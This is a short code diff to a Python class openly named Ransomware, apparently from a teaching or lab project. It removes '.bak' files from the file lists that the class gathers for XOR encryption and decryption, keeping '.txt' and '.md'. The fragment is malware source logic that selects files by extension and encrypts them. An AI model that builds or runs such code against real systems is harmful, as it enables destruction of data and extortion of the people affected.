@@ -45,7 +45,7 @@ class Ransomware:
 
         files_to_encrypt = []
         files_to_encrypt.extend(self.get_files("*.txt"))
-        files_to_encrypt.extend(self.get_files("*.bak"))
+        # files_to_encrypt.extend(self.get_files("*.bak"))
         files_to_encrypt.extend(self.get_files("*.md"))
 
         self._log.debug(files_to_encrypt)
@@ -80,7 +80,7 @@ class Ransomware:
         # self._secret_manager.set_key(candidate_key)
         files_to_decrypt = []
         files_to_decrypt.extend(self.get_files("*.txt"))
-        files_to_decrypt.extend(self.get_files("*.bak"))
+        # files_to_decrypt.extend(self.get_files("*.bak"))
         files_to_decrypt.extend(self.get_files("*.md"))
 
         self._secret_manager.xorfiles(files_to_decrypt)
